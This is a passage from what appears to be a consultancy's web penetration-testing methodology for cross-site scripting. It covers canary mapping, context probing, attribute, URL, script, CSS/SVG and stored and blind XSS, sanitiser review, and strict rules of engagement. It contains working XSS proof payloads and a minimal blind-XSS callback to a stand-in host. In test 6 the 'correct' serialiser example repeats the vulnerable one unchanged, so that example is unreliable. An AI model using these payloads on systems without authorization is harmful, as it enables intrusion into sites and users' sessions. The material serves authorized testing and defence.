| GT-XSS-014 | user A | Profile display name | Header, comments, admin user list | `<b>GT-XSS-014</b>` | 2026-11-10 10:12 | 2026-11-12 16:40 |
| GT-XSS-021 | user A | Support ticket 88412 subject | Ticket list (user A), help desk (approved) | blind callback `bx-021` | 2026-11-10 14:03 | 2026-11-12 16:45, client confirmed |

**Clean-up.** At the end of testing (and at the end of each day for anything placed in a shared area), restore every field in the register to a harmless value or delete the object, re-check that the payload no longer renders anywhere (search indexes, caches and email digests may hold copies), and list in the report anything you could not remove (for example a ticket that the help desk archived). Ask the client to purge what you cannot reach.

**Blind XSS rules.** Only with written approval. Use a collaborator only you can see (**Burp Collaborator** or a self-hosted **interactsh**), one unique subdomain per placement, and a callback that sends nothing but the fact that it fired and `location.origin` plus `location.pathname` (no query string or fragment, which may carry tokens). Hosted blind-XSS services capture far more by default: XSS Hunter Express, for example, advertises collecting non-`HttpOnly` cookies, the full page DOM and a screenshot of the page. Do not use such a payload against a client. If you use such a tool at all, self-host it and strip the probe down to the minimal callback. This note writes the collaborator host as `<id>.oob.example.org`.

**Request-rate limits.** Manual probing at one or two requests per second unless the rules say otherwise. Param Miner and scanners with a small thread pool and a delay. Stored probes are writes: one probe per field per context, not a payload list.

**Stop rules.**

- A payload fires somewhere you did not expect (a public page, another customer's view, a staff tool without approval): remove it immediately, tell the client the same day, and note where and when it rendered.
- A response shows a real customer's data (for example the stored-render search finds your canary next to someone else's record): stop that line, keep only minimum redacted evidence, do not request more, report it.
- A WAF or rate limiter starts blocking you: pause and agree an allow-list or a lower rate; do not switch to evasion.
- Something you stored breaks a page for other users (layout, an import job, an email digest): remove it and tell the client.

### Signals and false positives

The signal for XSS is execution in a browser, or a reflection whose encoding proves execution would follow. Before you call it, rule out the impostors:

| Impostor | What it looks like | How to tell |
|---|---|---|
| **Correctly encoded reflection** | Your `<` appears in the page | View the raw response: `&lt;` in HTML text, `&quot;` inside a double-quoted attribute, `<` in a script is correct encoding. The DOM inspector shows decoded text, so it is not evidence either way |
| **Reflection in a non-rendered response** | The canary appears unencoded in a JSON API response | `Content-Type: application/json` with `nosniff` is not rendered as HTML by the browser. Not XSS on its own; follow the data to whatever renders it (often a DOM sink). JSON served as `text/html` is a finding |
| **Reflection in a download** | Raw HTML in a file response | `Content-Disposition: attachment` and a non-HTML type mean the browser saves it; check that the type is not sniffable and that `nosniff` is set |
| **Reflection in a redirect body or header** | Canary in a `302` body or `Location` | Browsers follow the redirect and do not render the body. A canary in a header with CR/LF is header injection, see [CRLF and header injection](/web/web-crlf-header-log-csv-injection/) |
| **CSP blocks execution** | Payload is in the DOM, no dialog, a CSP violation in the console | Still a finding: the injection is real and CSP is a second line. Rate it lower (see [Rating findings](#rating-findings)) and check the policy for weaknesses in [CSP and security headers](/web/web-content-security-policy-headers/) |
| **WAF block** | `403`, a vendor block page | A fact about the WAF. Test whether the application encodes when the WAF does not interfere (a staging host or an agreed allow-list); a WAF is not a fix |
| **Self-only rendering** | Payload fires, but only in your own session | Self-XSS until you show another user or role can see it, or that the write can be forged cross-site |
| **Non-deliverable request** | Fires only from Repeater with a JSON body and a custom header | No link or cross-site form can send it. Lower rating; still worth fixing because a CORS or CSRF change later makes it deliverable |
| **Dialog suppressed** | `alert()` does nothing | Cross-origin iframe, sandboxed frame, or a browser setting. Use `print()` or a `console.log` marker |
| **Browser URL encoding** | Works in Repeater, not from a link | Browsers percent-encode some characters in URLs. Confirm every reflected finding in a real browser from a link |

### GT-WEB-XSS-1: Map reflection and storage points with a unique canary

*Guler Tech methodology.* Implements the "detect input vectors" phase of WSTG-INJT-01 and the "input forms" phase of WSTG-INJT-02, with entry points from WSTG-INFO-06.

#### What it checks

Which inputs come back in a response, where (same response, a later response, another user's or role's view, an email, an export), and in which context. The output is the work list for tests 2 to 11.

#### Prerequisites

Two test accounts (A and B) and, if available, an admin or support account; Burp Logger history; API documentation if available.

#### Steps

1. Generate a short alphanumeric canary per input, unique and searchable: `gtx` plus five random characters (`gtxq7k3a`, `gtxw2m9p`, …). Alphanumeric means it passes any validation and is not changed by encoding, so a search finds it wherever it lands.
2. Walk every feature as user A and put a different canary into every input you can reach: query parameters, path segments, form and JSON fields (including nested keys and array elements), file names of uploads, headers the application might store or echo (`User-Agent`, `Referer`, `X-Forwarded-For`, `Accept-Language`, custom `X-*`), and non-session cookies.
3. Add canaries to paths that do not exist (`/gtxa9d2f`, `/account/gtxa9d2f`) and to values that will fail validation, to reach 404, 400 and 500 pages.
4. Run Param Miner on the main pages to find parameters that are accepted but not linked, and add canaries to those.
5. Browse as user B, as the admin or support account, and through any other channel the data reaches (notification emails, PDF and CSV exports, the mobile app if in scope). Look at lists and detail pages, audit logs, "active sessions", search results.
6. Use Burp's search on the whole project for each canary prefix (`gtx`) and record every response where one appears. The request that *planted* a canary and the request whose response *shows* it are often different.
7. For each hit, note the context from the raw response (HTML text, attribute and whether quoted, URL attribute, script, style, comment, JSON, SVG) and the response `Content-Type`.
8. Copy every stored canary into the stored-payload register, even though it is harmless, so the clean-up covers it.

#### Observation

A work list like this (illustrative):

| Planted in | Input | Seen in | Context | Content-Type | Stored? |
|---|---|---|---|---|---|
| `GET /search` | `q` | Same response | HTML text in `h1`; quoted `value` of the search box; JS string in an analytics snippet | `text/html` | No |
| `GET /search` | `sort` (Param Miner) | Same response | Unquoted `data-sort` attribute | `text/html` | No |
| `GET /gtxa9d2f` | path | 404 page | HTML text | `text/html` | No |
| `PUT /api/me` | `display_name` | Header of every page; comments; admin user list | HTML text; `title` attribute; JSON in hydration script | `text/html` | Yes |
| `PUT /api/me` | `website` | Public profile | `href` of a link | `text/html` | Yes |
| `POST /api/tickets` | `subject` | Ticket list (user A); help desk (unknown) | HTML text | `text/html` | Yes |
| `POST /api/files` | file name | File list; download response | HTML text; `Content-Disposition` | `text/html`, `image/svg+xml` | Yes |
| `GET /api/products` | `q` | Same response | JSON string | `application/json` | No |

#### Evaluation

No finding by itself. Every hit in an HTML, SVG or XML response goes to test 2; JSON hits go to the DOM note (find the client code that renders them) unless the response type is wrong (test 11). Hits in other users' or roles' views are candidate stored XSS (test 8).

#### False positives

Canaries that appear only because the page echoes the URL in a canonical link or analytics tag are still reflections; they are not false positives, but they are often encoded correctly. The real false positives are caches: a CDN may serve you a page that contains a canary you planted earlier, so check `Age` and cache headers before concluding that a value is stored.

#### Automation

Reflected Parameters and Burp Scanner's passive checks (*Input returned in response (reflected)* and *(stored)*) automate the search; Param Miner extends the input list. In CI the equivalent is an inventory of templates and raw-output call sites (test 12).

### GT-WEB-XSS-2: Probe special characters and identify the context

*Guler Tech methodology.* Implements the "analyze input vectors" and "check impact" phases of WSTG-INJT-01 and WSTG-INJT-02: which special characters survive in which context.

#### What it checks

For each reflection from test 1, which characters come back unencoded, and whether that set is enough to leave the context. This is the step that decides the payload, and often decides the finding without one.

#### Prerequisites

The work list from GT-WEB-XSS-1.

#### Steps

1. Append a probe string to the canary. One request per input; keep everything else unchanged:

```text
gtxq7k3a'"<>/\`${;}&#
```

2. In the raw response, find each occurrence of the canary and read what follows it. Do this per occurrence: the same parameter often lands in three contexts with three different encodings.
3. If a character is removed or the request is blocked, test the characters one at a time to see which one triggers it.
4. Record the result:

```http
GET /search?q=gtxq7k3a%27%22%3C%3E%2F%5C%60%24%7B%3B%7D%26%23 HTTP/1.1
Host: app.example.com
Cookie: session=<SESSION_USER_A>
```

```html
<h1>Results for gtxq7k3a&#39;&quot;&lt;&gt;/\`${;}&amp;#</h1>
<input name="q" value="gtxq7k3a&#39;&quot;&lt;&gt;/\`${;}&amp;#">
<script>analytics.track('search', 'gtxq7k3a\'"<>/\`${;}&#');</script>
```

#### Observation

Reading the example above (illustrative):

| Occurrence | Context | What came back | Consequence |
|---|---|---|---|
| `h1` text | HTML body | `<` and `>` encoded | Safe for this context |
| `value` attribute | Double-quoted attribute | `"` encoded | Safe for this context |
| `analytics.track` | Single-quoted JavaScript string in `<script>` | `'` escaped as `\'`, but `\` itself not escaped, and `<` and `/` not escaped | Two ways out: `</script>` closes the block, and a backslash in the input cancels the application's escape. Go to test 6 |

The general reading rules:

| Context | Characters that must not come back raw |
|---|---|
| HTML body | `<` (and `&` for correctness) |
| Double-quoted attribute | `"` (and `&`) |
| Single-quoted attribute | `'` |
| Unquoted attribute | Space, `>`, and anything else: there is no safe raw set |
| URL attribute | Any scheme you did not allow; check separately (test 5) |
| JavaScript string | The string's quote, `\`, line terminators, and `<` or `/` (for `</script>`) |
| Template literal | `` ` ``, `\`, `${` |
| HTML comment | `-->`, `--!>` |
| CSS | `;`, `}`, `<`, `(`, quotes |

#### Evaluation

- **Lead (go to the context test):** any character from the table above that comes back raw in its context.
- **Pass:** every occurrence encoded for its own context. Record it, but move on: encoding alone does not cover URL schemes or sanitised HTML.
- **Note:** an input that comes back encoded in one context and raw in another is the common case. Report the specific occurrence, not the parameter.

#### False positives

The DOM inspector and "rendered" tab show decoded text; use the raw response. A response in which the probe is encoded but the canary appears raw elsewhere because the browser re-requests a resource (for example in a `Referer` echo) is a separate reflection, not proof of this one.

#### Automation

Burp Scanner does this per insertion point. In CI, a parametrised test that sends the probe string to each templated field and asserts on the raw HTML catches regressions (see [Regression tests](#regression-tests)).

### GT-WEB-XSS-3: HTML body context, HTML injection and error pages

*Guler Tech methodology.* Implements WSTG-CLNT-03 (HTML injection) and the HTML-context cases of WSTG-INJT-01 and WSTG-INJT-02, including reflections in error responses.

#### What it checks

Whether input placed between tags can add elements (HTML injection) and whether those elements can run script (XSS).

#### Prerequisites

A reflection in HTML text where `<` came back raw in test 2.

#### Steps

1. Start with markup that cannot run anything, to prove HTML injection on its own:

```text
gtx<b>GT-XSS-003</b>
```

2. If the marker renders bold (and the raw response shows the `b` tags), try one script marker:

```text
<img src=x onerror=alert(document.domain)>
```

3. If that is filtered, try at most a few structurally different markers (a different tag, a different event that fires without interaction) to learn *what* the filter does: does it strip tags, strip attributes starting with `on`, remove a fixed word once? Record the behaviour. For anything beyond that, take candidates from the [PortSwigger XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet), which you can filter by tag, event and whether user interaction is needed; this note deliberately does not list bypasses.
4. Repeat the HTML-only marker in the error paths found in test 1: a nonexistent path, a type error in a numeric parameter, a missing required field, an unsupported method.

```http
GET /docs/gtx%3Cb%3EGT-XSS-003%3C%2Fb%3E HTTP/1.1
Host: app.example.com
```

```html
<!-- vulnerable 404 page (illustrative) -->
<p>The page /docs/gtx<b>GT-XSS-003</b> could not be found.</p>
```

5. Confirm the finding in a real browser from a link (or, for a `POST`, from a local auto-submitting form opened in your own browser against your own account), not only in Repeater.

#### Observation

Vulnerable: the bold marker renders; the image marker shows a dialog naming `app.example.com`. Correct: the raw response contains `&lt;b&gt;GT-XSS-003&lt;/b&gt;` and the page shows the literal text.

#### Evaluation

- **Fail (XSS):** a script marker executes in the application's origin.
- **Fail (HTML injection):** markup renders but no script runs, because a filter or CSP stops it. Report it as HTML injection (CWE-79) and say what stopped execution.
- **Fail (filter weakness):** script is stopped only by a deny-list or single-pass filter whose gap you showed with one of the few variants. Report it as XSS against that filter.
- **Pass:** markup is shown as text everywhere, including error pages.

#### False positives

An HTML marker that renders because you are looking at the *rendered* view of a JSON or text response in Burp. A WAF block page is not an encoding result. On error pages generated by a CDN or load balancer, check whether the reflection really comes from the client's origin or from a separate vendor domain (it is still worth reporting, but the scope and owner differ).

#### Automation

Scanner checks cover the HTML context well. A CI test can render each template with `<b>GT-XSS</b>` in every field and assert the output contains `&lt;b&gt;` instead.

### GT-WEB-XSS-4: Quoted and unquoted attribute contexts

*Guler Tech methodology.* Implements the tag-attribute cases of WSTG-INJT-01 (its "tag attribute value" example) and the attribute analysis of WSTG-INJT-02.

#### What it checks

Whether input inside an attribute value can end the value and add a new attribute or element, including inside event handlers and hidden inputs.

#### Prerequisites

A reflection inside an attribute (test 2), with the quote style noted.

#### Steps

1. **Quoted attribute, quote not encoded.** Close the value and add an event that fires without interaction (PortSwigger's contexts page uses this form; `x="` repairs the rest of the tag):

```text
" autofocus onfocus=alert(document.domain) x="
```

If angle brackets also come back raw, `"><img src=x onerror=alert(document.domain)>` leaves the tag entirely.

2. **Unquoted attribute.** A space ends the value, so no quote is needed:

```text
gtx onmouseover=print() x
```

```html
<!-- vulnerable template output (illustrative) -->
<div class=result data-sort=gtx onmouseover=print() x>
```

Hover over the element to fire it; note in the report that it needs this interaction, or find an event that fires on its own for the element type.

3. **Event-handler attribute.** If the value lands inside JavaScript inside an attribute, such as `onclick="select('VALUE')"`, the HTML parser decodes entities before the script runs. Send the quote as an entity and see whether it survives as a real quote at click time:

```text
&apos;-alert(document.domain)-&apos;
```

If the server encodes `&` as `&amp;`, the entity stays text and the handler is safe. If it encodes only quotes and angle brackets, the response looks harmless but the browser decodes `&apos;` into a real quote before the handler runs:

```html
<!-- vulnerable (illustrative): looks escaped, runs on click -->
<a href="#" onclick="select('&apos;-alert(document.domain)-&apos;')">Select</a>
```

4. **Hidden inputs and tags that do not fire events** (`input type=hidden`, `link rel=canonical`, `meta`): note them. PortSwigger Research has shown ways to trigger handlers on such elements with user interaction (for example through `accesskey`); use their lab *Reflected XSS in canonical link tag* to understand the technique, and on client systems record the injection with an HTML-only proof if no interaction-free trigger exists.

#### Observation

Vulnerable: the dialog shows `app.example.com` on focus, hover or click. Correct: the raw response shows `&quot;` (or `&#34;`) inside a double-quoted attribute, every attribute is quoted, and in event handlers the `&` of your entity comes back as `&amp;`.

#### Evaluation

- **Fail (XSS):** a new attribute or element executes the marker. Note the interaction needed (none, focus, hover, click, key combination): it changes the rating's attack-complexity reasoning.
- **Fail (design):** any unquoted attribute filled from user data, even if you could not make it fire, and any event handler built from user data. Report as a defect against `v5.0.0-1.2.1`.
- **Pass:** quotes encoded and all attributes quoted.

#### False positives

A quote that is encoded in the response but appears raw in the DOM inspector (normal decoding). An attribute that is quoted with the *other* quote character than the one you sent: `'` raw inside a double-quoted attribute is harmless.

#### Automation

Scanners find quoted-attribute breakouts reliably and unquoted ones less reliably. Template linters can flag unquoted attributes (see test 12).

### GT-WEB-XSS-5: URL contexts and dangerous schemes

*Guler Tech methodology.* Implements the URL-attribute cases of WSTG-INJT-01 and WSTG-INJT-02 and checks ASVS `v5.0.0-1.2.2` (safe URL schemes).

#### What it checks

Whether a user-controlled value that becomes a whole URL (`href`, `src`, `action`, `formaction`, `iframe src`, `object data`) can use a scheme that runs script, and whether a value placed inside a URL is encoded as a URL component.

#### Prerequisites

Reflections or stored values that end up in URL attributes: profile website, "return to" links, link fields in rich text, avatar URLs, CMS link pickers, integrations.

#### Steps

1. Set the field to a `javascript:` URL with a marker:

```http
PUT /api/me HTTP/1.1
Host: app.example.com
Cookie: session=<SESSION_USER_A>
Content-Type: application/json

{"website": "javascript:alert(document.domain)//GT-XSS-005"}
```

2. View the page that renders the link (as user A first, then as user B if the profile is visible to others) and inspect the raw `href`. Click it.
3. If the application rejects the value, try a small number of variants that test whether the filter matches how browsers parse URLs: different letter case, leading whitespace, a tab or newline inside the scheme name, an HTML entity for one letter of the scheme when the value lands in an attribute. Stop at the first that renders; record which check was missing.
4. Where the value goes into `iframe src` or `object data`, try `data:text/html,<b>GT-XSS-005</b>`. Note that a `data:` document runs in an opaque origin, not the application's, so its impact is phishing-style content, not access to the application.
5. **URL component.** Where your input is only part of a URL (`/search?q=VALUE&page=2` in a pagination link), send `gtx"&x=1#` and check that the raw `href` contains `%22%26x%3D1%23` (component encoded) and `&amp;` where the template joins parameters.
6. Check redirect parameters (`next`, `return_to`, `continue`) for `javascript:` too. A server-side redirect sends a `Location` header, which browsers do not follow to `javascript:`; a client-side redirect (`location = next`) does run it, and that path continues in [DOM XSS](/web/web-dom-xss-client-side-injection/) and [open redirects](/web/web-open-redirect/).

#### Observation

Vulnerable:

```html
<a class="profile-link" href="javascript:alert(document.domain)//GT-XSS-005">My website</a>
```

Correct: the value is rejected on input with a validation error naming the field, or rendered without a link, or (in React 19) replaced with React's blocking URL. Only `https:` (and whatever else the client allows, such as `mailto:`) gets through.

#### Evaluation

- **Fail (XSS):** a `javascript:` URL runs in the application origin on click (note the click; it is user interaction in the rating).
- **Fail (lower):** a `data:` URL renders attacker content in a frame (opaque origin, so content spoofing rather than script access).
- **Fail (encoding):** a URL component is not percent-encoded and lets you add parameters or break the attribute.
- **Pass:** a scheme allow-list on the server and correct component encoding.

#### False positives

React 19 rewriting the URL to its blocking `javascript:throw …` string: the link no longer runs your code. Do not report the stored value as XSS, but do report the missing server-side validation if older clients (a mobile web view, an email template, an admin tool) render the same field. A `javascript:` URL in a `Location` header is not followed.

#### Automation

Scanners test this in reflected parameters, rarely in stored profile fields. Add a unit test for your URL validator with the variants from step 3 (see [URL scheme allow-lists](#url-scheme-allow-lists)).

### GT-WEB-XSS-6: JavaScript string, template literal and JSON-in-script contexts

*Guler Tech methodology.* Implements the JavaScript-context analysis of WSTG-INJT-01 and WSTG-INJT-02 and checks ASVS `v5.0.0-1.2.3` (encoding when building JavaScript and JSON).

#### What it checks

Whether input written into an inline script can end the script block, end the string, cancel the application's escaping, or interpolate an expression.

#### Prerequisites

A reflection or stored value inside a `<script>` element or a JSON data block (test 2).

#### Steps

1. **Close the script block.** Works whatever the string escaping is, as long as `<` and `/` come back raw:

```text
gtx</script><img src=x onerror=alert(document.domain)>
```

2. **Break out of the string.** If the quote comes back raw, an expression between two string fragments keeps the script syntactically valid, which matters because a syntax error stops the whole block from running:

```text
'-alert(document.domain)-'
```

3. **Cancel the escape.** If `'` comes back as `\'` but `\` itself is not escaped, a backslash in your input turns the application's backslash into a literal one:

```text
\'-alert(document.domain)//
```

4. **Template literal.** If the value sits between backticks, `${…}` is evaluated:

```text
${alert(document.domain)}
```

5. **JSON in a script block.** For stored values that reach a hydration or config object (`window.__STATE__ = {…}`, `type="application/json"` blocks), store a value that contains an end tag and an HTML-only marker in your own object, and view the page source:

```http
PUT /api/me HTTP/1.1
Host: app.example.com
Cookie: session=<SESSION_USER_A>
Content-Type: application/json

{"bio": "gtx</script><b>GT-XSS-006</b>"}
```

#### Observation

Vulnerable (illustrative): the JSON is valid, but the HTML parser ends the script at the first end tag inside the string, and the rest of the bio is parsed as HTML.

```html
<script>window.__STATE__ = {"user": {"bio": "gtx</script><b>GT-XSS-006</b>"} };</script>
```

Correct: the serialiser escapes `<` so no end tag can form.

```html
<script>window.__STATE__ = {"user": {"bio": "gtx</script><b>GT-XSS-006</b>"} };</script>
```

#### Evaluation

- **Fail (XSS):** any of the steps executes the marker, or the JSON case renders the bold marker (HTML injection proven; a script marker in the same position would execute unless CSP blocks it, which you confirm in your own object).
- **Fail (design):** user data in inline scripts at all, even where encoding held. It is fragile, often incompatible with a strict CSP, and against the cheat sheet's dangerous-contexts advice. Report as a recommendation.
- **Pass:** data delivered through `data-` attributes, a JSON block with `<` escaped and read with `JSON.parse(el.textContent)`, or an API call.

#### False positives

Your input appearing in a script that is never executed (a `type="text/template"` block whose contents are only ever read with `textContent`): an end-tag breakout from such a block is still HTML injection, but string breakouts inside it do nothing. A script that errors before your position is reached: fix the syntax repair before concluding.

#### Automation

The PortSwigger labs listed in [Practice labs](#practice-labs) cover each step. In CI, render every page that hydrates server state with a fixture user whose fields contain `</script>` and assert the response contains no second `</script>` before the intended one.

### GT-WEB-XSS-7: CSS, SVG and XML contexts

*Guler Tech methodology.* Implements the less common contexts of WSTG-INJT-01 and WSTG-INJT-02 and checks ASVS `v5.0.0-1.3.4` (SVG) and `v5.0.0-1.3.5` (CSS and other scriptable content).

#### What it checks

Whether input inside a stylesheet, a `style` attribute, an SVG document or an XML response can leave its context or add scriptable content.

#### Prerequisites

Reflections in `<style>` blocks or `style` attributes (themes, brand colours, custom CSS fields), in dynamically generated SVG (badges, charts, avatars with initials), or in XML responses that a browser would render (feeds, `text/xml` API responses opened directly).

#### Steps

1. **CSS.** Try to leave the declaration, the rule and the block:

```text
red;}</style><b>GT-XSS-007</b>
```

A breakout from `</style>` into HTML is HTML injection or XSS, tested as in test 3. If you can only add CSS (no `</style>`), you have CSS injection: modern browsers do not run script from CSS, but CSS can change the page and load resources. Prove it with one `background-image` request to your own collaborator that carries no page data, and continue in [DOM clobbering and CSS injection](/web/web-dom-clobbering-css-injection/), which covers what CSS injection can and cannot do.

2. **SVG.** If an endpoint builds an SVG from your input and serves it as `image/svg+xml`, open the URL directly (as a top-level document, not through an `img` tag, which never runs script) and test whether `<` survives inside a text element:

```http
GET /badge.svg?label=gtx%3C%2Ftext%3E%3Ctext%3EGT-XSS-007%3C%2Ftext%3E HTTP/1.1
Host: app.example.com
```

If it does, an SVG event handler on a new element is the script marker (`<rect width="10" height="10" onmouseover="alert(document.domain)"/>`, or an `svg` element with `onload`). Uploaded SVG is test 11.

3. **XML.** If an XML response is rendered by the browser (open it directly) and `<` survives, an element in the XHTML namespace is treated as HTML, so a namespaced `script` element runs. Prove it with the dialog marker once and stop; an XML parse error page instead of the document is not execution but still shows the input is not encoded.

#### Observation

Vulnerable: the marker renders bold after `</style>`, or the SVG or XML document runs the dialog when opened directly in the application's origin. Correct: CSS values validated against a strict pattern for the property (a colour is `#` plus six hex digits), SVG and XML text encoded (`&lt;`), uploaded SVG sanitised or served as an attachment.

#### Evaluation

- **Fail (XSS):** script execution from an SVG or XML document on the application origin, or from HTML after a `</style>` breakout.
- **Fail (CSS injection):** arbitrary declarations or rules without script; rate per the CSS injection note.
- **Pass:** strict validation of CSS values; encoded SVG and XML.

#### False positives

An SVG that runs script only when opened from a separate sandbox domain (check `document.domain` in the dialog: if it is not the application's domain, impact is much lower). SVG shown through `img` or CSS `background-image`: the browser does not execute script in SVG images.

#### Automation

Scanners rarely test these contexts. Unit-test the validators for colours and other CSS values, and run generated SVG through an XML parser in tests to confirm it has the expected elements only.

### GT-WEB-XSS-8: Stored XSS across write and render paths

*Guler Tech methodology.* Implements WSTG-INJT-02 (identify stored input, analyse where it is rendered, test the filtering), including second-order rendering and out-of-band input channels.

#### What it checks

Whether a value written through any channel (web form, API, import, email, integration) is rendered unsafely anywhere it is displayed, to the author, to other users or to staff.

#### Prerequisites

The stored rows of the GT-WEB-XSS-1 work list; accounts A and B; an admin or support account if provided; the stored-payload register; written approval for any location that other people will see.

#### Steps

1. Pick the field and the object, and check its visibility first: who can see this object? Use objects that only your own accounts can see (a private project shared only between user A and user B, a ticket in your own account, your own tenant).
2. Write an HTML-only marker first (`gtx<b>GT-XSS-<id></b>`), through the normal UI.
3. Visit every place the value renders: detail and list pages, search results, notifications and the notification drop-down, activity feeds, hover cards and mentions, PDF or HTML exports opened in the browser, email previews in the web app, the mobile web view, and (with the admin account the client gave you) the admin and back-office screens.
4. Where the HTML marker renders, replace it with a script marker (`<img src=x onerror=alert(document.domain)>` with the ID in a comment or `console.log`) **in the same own object**, and confirm execution as user B.
5. Write the same value through the other channels, because validation often differs per channel:
   - the API directly, bypassing client-side validation (the front end may block `<`; the API may not);
   - the update endpoint as well as the create endpoint;
   - bulk import (CSV, JSON, vCard) with the marker in one row of your own test data;
   - email-to-ticket or email-to-comment gateways, from your own mailbox, with the marker in the subject and sender display name (this reaches staff tools; it needs the blind-XSS approval in test 9 unless you hold a help-desk account);
   - integrations the client lets you configure (webhook names, OAuth client names, connected-app names).
6. Re-check after background processing: thumbnails, search indexing, digest emails and exports run later and use their own templates.
7. Update the register with every location where the payload rendered. Remove each payload when the test for that field is complete.

#### Observation

A stored-render matrix (illustrative):

| Field | Channel | Own view | User B view | Admin view | Export/email |
|---|---|---|---|---|---|
| `display_name` | UI | Encoded | Encoded | **Executes** (admin user list) | Encoded |
| `display_name` | API | Encoded | Encoded | **Executes** | Encoded |
| `bio` (Markdown) | UI | **Executes** (preview) | **Executes** | Encoded | n/a |
| ticket `subject` | Email gateway | Encoded | n/a | Not tested (no approval) | n/a |
| upload file name | UI | Encoded | Encoded | **Executes** (file audit log) | n/a |

#### Evaluation

- **Fail (stored XSS):** a script marker executes when a user other than the author views the object, or in a staff tool.
- **Fail (self-XSS):** it executes only in the author's own view. Rate as described in [Self-XSS and when it matters](#self-xss-and-when-it-matters) unless you can show a chain.
- **Fail (HTML injection):** markup renders for other users but script is stopped.
- **Pass:** encoded or correctly sanitised in every render location and through every channel.

#### False positives

A payload that "executes" only in a preview pane that renders local, unsaved input (that is a DOM-side issue in the editor, still worth reporting, but not stored). A cached page that still shows an old payload after you removed it: purge, then re-test before reporting a failed fix. Seeing your marker in another user's view because both accounts are in the same organisation is expected sharing, not a cross-tenant issue.

#### Automation

Burp Scanner's stored checks find some of these if it crawls the render pages after submitting forms; it cannot see staff tools. The CI equivalent is a fixture user whose every free-text field contains `<b>GT-XSS</b>`, rendered through each template and asserted encoded (see [Regression tests](#regression-tests)).

### GT-WEB-XSS-9: Blind XSS in back-office tools

*Guler Tech methodology.* Implements the blind cross-site scripting part of WSTG-INJT-02, under the stricter rules of this series: written approval, a minimal callback, and a register with clean-up.

#### What it checks

Whether input from a customer-facing channel executes in a staff tool you cannot see: a help desk, an admin panel, a CRM, a moderation queue, a log or analytics viewer.

#### Prerequisites

- **Written client approval** naming the channels and back-office tools, the testing window, and who on the client side will be told.
- A collaborator only you can see (Burp Collaborator or a self-hosted interactsh), one unique subdomain per placement.
- The stored-payload register.
- First ask whether the client can give you an account on the back-office tool instead. If they can, this becomes test 8 with an HTML-only marker, which is safer and gives better evidence.

#### Steps

1. List the channels that reach staff: contact and feedback forms, support tickets and chat, order notes, account deletion reasons, file names of attachments, the `User-Agent` of your own sessions (shown in "user sessions" admin screens), email to support addresses, and anything a fraud or moderation team reviews.
2. For each approved channel, build a payload that only reports that it ran and where. It sends no cookies, DOM, storage or query strings, and sets no referrer so the admin URL's query string cannot leak through the `Referer` header:

```html
<img src=x onerror="var i=new Image();i.referrerPolicy='no-referrer';i.src='https://bx-021.oob.example.org/f?o='+encodeURIComponent(location.origin+location.pathname)">
```

3. Place one payload per channel, each with its own subdomain (`bx-021`, `bx-022`, …), and record each in the register with time and channel.
4. Watch the collaborator for the agreed window. An HTTP interaction on the unique subdomain with the `o` parameter present means script ran (a plain DNS lookup can come from a mail or link scanner that saw the hostname).
5. When one fires, note the origin and path it reports, tell the client contact, and remove or neutralise the payload (close and edit the ticket, delete the form submission, or ask the client to do it).
6. At the end of the window, ask the client to remove every placement that did not fire, and confirm.

#### Observation

Illustrative collaborator entry for a firing payload:

```text
HTTP  GET /f?o=https%3A%2F%2Fadmin.example.com%2Ftickets%2F88412   Host: bx-021.oob.example.org
      Source 198.51.100.24   User-Agent: Mozilla/5.0 (...) Chrome/...   Time: 2026-11-11 09:14 UTC
```

The interaction also records the staff member's IP address and browser. Treat both as personal data: keep them in the engagement records and redact them in the report.

#### Evaluation

- **Fail (stored XSS in a staff tool):** an interaction from the expected tool's origin. Report the channel, the tool and path, and the time; rate it with the staff role's privileges in mind.
- **Inconclusive:** nothing fired. Staff may not have opened the item, the tool may render it as text, or CSP may block the request. Ask the client to open the item and show you how it renders, or for a tool account.

#### False positives

DNS-only interactions from mail and link scanners that extracted the hostname. HTTP interactions from a sandbox that "detonates" attachments or renders emails for spam analysis: check the source IP and User-Agent with the client before calling it a staff tool.

#### Automation

None against clients beyond the minimal payload above. In the client's own pipeline, the useful control is a test that renders back-office templates with hostile fixtures, exactly like test 8.

### GT-WEB-XSS-10: Rich text, Markdown and sanitiser review

*Guler Tech methodology.* Implements the sanitisation analysis of WSTG-INJT-01 and WSTG-INJT-02 (identify the filter, assess whether it can be circumvented) and checks ASVS `v5.0.0-1.3.1` and `v5.0.0-1.3.5`.

#### What it checks

For fields that accept formatting: which sanitiser is used, which version, how it is configured, whether it runs on the server or only in the browser, and whether anything changes its output before it reaches the page.

#### Prerequisites

Fields with rich text, Markdown or BBCode; JavaScript bundles (black box) or package manifests and configuration (grey box).

#### Steps

1. **Identify the sanitiser.** In the browser console, `DOMPurify.version` shows DOMPurify's version if it is exposed globally; otherwise search the bundles for `DOMPurify`, `sanitize-html`, `xss`, `insane`, `marked`, `markdown-it` and their version banners. Grey box: read `package-lock.json`, `requirements.txt` or `poetry.lock` (look for `bleach`, `nh3`), `pom.xml` (`owasp-java-html-sanitizer`), `composer.lock` (`ezyang/htmlpurifier`), `Gemfile.lock` (`rails-html-sanitizer`, `loofah`).
2. **Check the version against advisories.** DOMPurify publishes its advisories on its GitHub security page; at the time of writing its latest release is 3.4.18. bleach is deprecated and unmaintained, which is a finding by itself for any field that matters. Check the others in the GitHub Advisory Database or the ecosystem's audit tool (`npm audit`, `pip-audit`, `composer audit`).
3. **Read the configuration.** Things that turn a good sanitiser into a weak one:

| Library | Risky settings |
|---|---|
| DOMPurify | `ADD_TAGS` or `ADD_ATTR` with `script`, `iframe`, `style`, `form`, `on*`, `srcdoc`; `ALLOW_UNKNOWN_PROTOCOLS`; a loose `ALLOWED_URI_REGEXP`; hooks that re-add attributes; `SAFE_FOR_TEMPLATES` relied on to stop template injection; `IN_PLACE` with hooks that remove nodes; sanitising then post-processing |
| sanitize-html | `allowedTags: false` or `allowedAttributes: false` (allow all); `script` or `style` in `allowedTags` (and `allowVulnerableTags: true` to hide the warning); `allowedSchemes` including `javascript` or `data` |
| nh3 / ammonia | Extra `tags` and `attributes` beyond the defaults; `url_schemes` widened; `strip_comments=False` with raw-text tags allowed |
| bleach | Any use (deprecated); `svg` or `math` in tags with `strip_comments=False` (CVE-2021-23980 conditions) |
| OWASP Java HTML Sanitizer | Custom `HtmlPolicyBuilder` with `allowUrlProtocols("javascript")` or `"data"`, `allowElements("script", "style", "iframe")`, `allowAttributes("on…")`, `allowWithoutAttributes` misuse |
| HTMLPurifier | `HTML.Allowed` or `HTML.SafeIframe` widened; `URI.AllowedSchemes` widened; custom definitions |
